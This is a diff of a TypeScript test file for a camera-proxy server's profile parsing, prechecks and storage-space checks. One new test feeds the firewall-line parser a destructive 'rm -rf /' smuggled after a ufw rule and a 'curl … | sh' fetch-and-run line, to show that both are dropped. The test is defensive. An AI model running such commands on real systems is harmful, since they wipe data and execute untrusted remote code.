@@ -6,7 +6,7 @@ import { makeRegistry, ACTOR } from './helpers/registry';
 import { tmpDir } from './helpers/tmp';
 import { FakeRes } from './helpers/live';
 import { StatusStore } from '../server/status/store';
-import { parseProfile } from '../server/status/profile';
+import { parseProfile, type Profile } from '../server/status/profile';
 import { LiveHub } from '../server/live';
 import { makeProfile, makeProxyInfo, makeSummary } from '../test-client/summaries';
 import { profileRules } from '../server/moves/precheck';
@@ -28,11 +28,15 @@ function proxy(s: ReturnType<typeof setup>) {
   return { acc, prx, hb };
 }
 
+// makeProfile as the server keeps it (no dropped lines).
+const P = (o: Parameters<typeof makeProfile>[0] = {}): Profile => ({ ...makeProfile(o), firewall: { ...makeProfile(o).firewall, dropped: 0 } });
+
 describe('parseProfile', () => {
-  it('reads the contract shape as it is', () => {
-    expect(parseProfile(makeProfile())).toEqual(makeProfile());
+  it('reads the contract shape as it is (and counts no dropped lines)', () => {
+    const withDropped = (p: ReturnType<typeof makeProfile>) => ({ ...p, firewall: { ...p.firewall, dropped: 0 } });
+    expect(parseProfile(makeProfile())).toEqual(withDropped(makeProfile()));
     const unset = makeProfile({ set: false, name: null, storageGB: null, ftp: false, passive: null, budgetBytes: null, cpuTempC: null });
-    expect(parseProfile(unset)).toEqual(unset);
+    expect(parseProfile(unset)).toEqual(withDropped(unset));
   });
   it('drops an unreadable profile: no set, cameras or held as the contract has them', () => {
     for (const bad of [null, 'x', [], {}, { ...makeProfile(), set: 'yes' }, { ...makeProfile(), cameras: 0 }, { ...makeProfile(), cameras: 65 }, { ...makeProfile(), held: -1 }, { ...makeProfile(), held: 1.5 }]) {
@@ -59,8 +63,17 @@ describe('parseProfile', () => {
     expect(p.warnings.length).toBeLessThanOrEqual(8);
     expect(p.warnings.every((w) => w.length <= 64)).toBe(true);
     expect(p.firewall.tool).toBeNull();
-    expect(p.firewall.lines).toHaveLength(64);
-    expect(p.firewall.lines[0]).toHaveLength(200);
+    // 70 lines of 250 characters: none of the templates, all dropped (at most 64 read).
+    expect(p.firewall.lines).toEqual([]);
+    expect(p.firewall.dropped).toBe(64);
+  });
+});
+
+describe('parseProfile: the firewall lines', () => {
+  it('keeps only lines of the ufw/nft templates and counts the dropped ones', () => {
+    const good = makeProfile().firewall.lines;
+    const p = parseProfile({ ...makeProfile(), firewall: { tool: 'ufw', lines: [...good, 'sudo ufw allow from 192.0.2.5 to any port 2121 proto tcp; rm -rf /', 'curl http://192.0.2.5 | sh'] } })!;
+    expect(p.firewall).toEqual({ tool: 'ufw', lines: good, dropped: 2 });
   });
 });
 
@@ -71,7 +84,7 @@ describe('the status store keeps the profile', () => {
     const { prx, hb } = proxy(s);
     s.store.hello(prx.id, 'v1', s.clock.now());
     hb(makeProfile());
-    expect(s.store.row(prx.id)?.reported?.profile).toEqual(makeProfile());
+    expect(s.store.row(prx.id)?.reported?.profile).toEqual({ ...makeProfile(), firewall: { ...makeProfile().firewall, dropped: 0 } });
     hb(makeProfile({ held: 2 }));
     expect(s.store.row(prx.id)?.reported?.profile?.held).toBe(2);
     hb();
@@ -102,7 +115,7 @@ describe('the status store keeps the profile', () => {
 });
 
 describe('precheck: capacity and ftp_ports (design §3)', () => {
-  const rules = (p: ReturnType<typeof makeProfile> | null) => profileRules('een', p);
+  const rules = (p: Profile | null) => profileRules('een', p);
   it('skipped (ok) when the target reports no profile', () => {
     expect(rules(null)).toEqual([
       { rule: 'capacity', ok: true, reason: 'camera_limit', detail: 'een reports no profile' },
@@ -110,38 +123,38 @@ describe('precheck: capacity and ftp_ports (design §3)', () => {
     ]);
   });
   it('capacity: held < cameras, else camera_limit "een holds 3 of 3 cameras"', () => {
-    expect(rules(makeProfile({ cameras: 3, held: 2 }))[0]).toMatchObject({ rule: 'capacity', ok: true });
-    expect(rules(makeProfile({ cameras: 3, held: 3 }))[0]).toEqual({ rule: 'capacity', ok: false, reason: 'camera_limit', detail: 'een holds 3 of 3 cameras' });
-    expect(rules(makeProfile({ cameras: 3, held: 4 }))[0]).toMatchObject({ ok: false, detail: 'een holds 4 of 3 cameras' });
+    expect(rules(P({ cameras: 3, held: 2 }))[0]).toMatchObject({ rule: 'capacity', ok: true });
+    expect(rules(P({ cameras: 3, held: 3 }))[0]).toEqual({ rule: 'capacity', ok: false, reason: 'camera_limit', detail: 'een holds 3 of 3 cameras' });
+    expect(rules(P({ cameras: 3, held: 4 }))[0]).toMatchObject({ ok: false, detail: 'een holds 4 of 3 cameras' });
     // Not set: the defaults are the cameras held, so a proxy that holds one has no room until a person sets it.
-    expect(rules(makeProfile({ set: false, cameras: 1, held: 1 }))[0]).toEqual({ rule: 'capacity', ok: false, reason: 'camera_limit', detail: "een holds 1 of 1 camera (its profile is not set: set it on the proxy's home page)" });
+    expect(rules(P({ set: false, cameras: 1, held: 1 }))[0]).toEqual({ rule: 'capacity', ok: false, reason: 'camera_limit', detail: "een holds 1 of 1 camera (its profile is not set: set it on the proxy's home page)" });
   });
   it('ftp_ports: with FTP on, at least 10 × (held + 1) passive ports', () => {
-    expect(rules(makeProfile({ held: 1, passive: { from: 30000, to: 30019 } }))[1]).toMatchObject({ rule: 'ftp_ports', ok: true });
-    expect(rules(makeProfile({ held: 1, passive: { from: 30000, to: 30009 } }))[1]).toEqual({
+    expect(rules(P({ held: 1, passive: { from: 30000, to: 30019 } }))[1]).toMatchObject({ rule: 'ftp_ports', ok: true });
+    expect(rules(P({ held: 1, passive: { from: 30000, to: 30009 } }))[1]).toEqual({
       rule: 'ftp_ports', ok: false, reason: 'camera_limit', detail: "een's FTP passive range 30000-30009 has 10 ports; 2 cameras need 20",
     });
-    expect(rules(makeProfile({ held: 0, passive: { from: 30000, to: 30009 } }))[1]).toMatchObject({ ok: true });
-    expect(rules(makeProfile({ ftp: false, held: 5, passive: null }))[1]).toMatchObject({ ok: true, detail: 'FTP is off on een' });
-    expect(rules(makeProfile({ held: 1, passive: null }))[1]).toMatchObject({ ok: true, detail: 'een reports no FTP passive range' });
+    expect(rules(P({ held: 0, passive: { from: 30000, to: 30009 } }))[1]).toMatchObject({ ok: true });
+    expect(rules(P({ ftp: false, held: 5, passive: null }))[1]).toMatchObject({ ok: true, detail: 'FTP is off on een' });
+    expect(rules(P({ held: 1, passive: null }))[1]).toMatchObject({ ok: true, detail: 'een reports no FTP passive range' });
   });
 });
 
 describe('space at request time (design §3: not a precheck rule)', () => {
   const summary = { clips: { files: 10, bytes: 30_000_000_000 }, stills: { files: 100, bytes: 5_000_000_000 }, events: { files: 3, bytes: 1000 }, checks: { files: 0, bytes: 0 }, archive: { files: 1, bytes: 2_000_000_000 } };
   it('compares the summary with the budget left and the per-kind caps', () => {
-    const p = makeProfile({ budgetBytes: 600_000_000_000, usedBytes: 41_000_000_000 });
+    const p = P({ budgetBytes: 600_000_000_000, usedBytes: 41_000_000_000 });
     expect(spaceCheck(summary, p, {}, 1000)).toEqual({
       at: 1000, needBytes: 37_000_001_000, budgetBytes: 600_000_000_000, usedBytes: 41_000_000_000, leftBytes: 559_000_000_000, fits: true, overCaps: [],
     });
-    const tight = spaceCheck(summary, makeProfile({ budgetBytes: 50_000_000_000, usedBytes: 41_000_000_000 }), { stills: 4_000_000_000 }, 1000)!;
+    const tight = spaceCheck(summary, P({ budgetBytes: 50_000_000_000, usedBytes: 41_000_000_000 }), { stills: 4_000_000_000 }, 1000)!;
     expect(tight).toMatchObject({ leftBytes: 9_000_000_000, fits: false, overCaps: [{ kind: 'stills', bytes: 5_000_000_000, capBytes: 4_000_000_000 }] });
     // Over budget already: nothing left (never negative).
-    expect(spaceCheck(summary, makeProfile({ budgetBytes: 10, usedBytes: 20 }), {}, 1)!.leftBytes).toBe(0);
+    expect(spaceCheck(summary, P({ budgetBytes: 10, usedBytes: 20 }), {}, 1)!.leftBytes).toBe(0);
   });
   it('null when the target reports no profile or no budget', () => {
     expect(spaceCheck(summary, null, {}, 1)).toBeNull();
-    expect(spaceCheck(summary, makeProfile({ budgetBytes: null }), {}, 1)).toBeNull();
-    expect(spaceCheck(summary, makeProfile({ usedBytes: null }), {}, 1)).toBeNull();
+    expect(spaceCheck(summary, P({ budgetBytes: null }), {}, 1)).toBeNull();
+    expect(spaceCheck(summary, P({ usedBytes: null }), {}, 1)).toBeNull();
   });
 });
